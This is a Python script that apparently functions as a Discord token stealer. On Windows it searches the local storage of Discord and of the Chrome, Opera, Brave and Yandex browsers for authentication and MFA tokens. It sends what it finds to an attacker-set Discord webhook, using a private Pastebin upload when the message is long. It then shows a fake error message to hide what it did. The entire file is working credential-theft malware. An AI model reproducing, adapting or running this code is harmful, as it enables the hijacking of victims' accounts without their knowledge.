import os
import re
import requests as req
from dhooks import Webhook

Webhook_URL = ''
Pastebin_KEY = ''


def paste(msg):
    data = {
    'api_option': 'paste',
    'api_dev_key': Pastebin_KEY,
    'api_paste_code': msg,
    'api_paste_name': 'Tokens',
    'api_paste_expire_date': '1D',
    'api_user_key': None,
    'api_paste_private': 1
    }

    r = req.post("https://pastebin.com/api/api_post.php", data=data)

    try:
        return r.text
    except:
        return 0


def error():
    print('Oops! An error has occurred!\n')
    print('YOUR ERROR HERE')


def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    rgx_tkn1 = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    rgx_tkn2 = 'mfa\.[\w-]{84}'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (rf'{rgx_tkn1}', rf'{rgx_tkn2}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    if str(os.name) == 'nt':
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = ''

        for key, value in paths.items():
            try:    
                tokens = find_tokens(value)
                message += f'\n**{key}**\n'
                message += f'{tokens}'
            except:
                pass
        
        if len(message) > 2000:
            url = paste(message)
            if url != 0:
                try:
                    Webhook(Webhook_URL).send(url)
                except:
                    pass
            else:
                Webhook(Webhook_URL).send('Paste failed somehow: trying regular upload:')
                Webhook(Webhook_URL).send(message)
        
        else:
            Webhook(Webhook_URL).send(message)

        error()
        input("Press enter to exit")

    else:
        Webhook(Webhook_URL).send('Code ran, but not on Windows')   

main()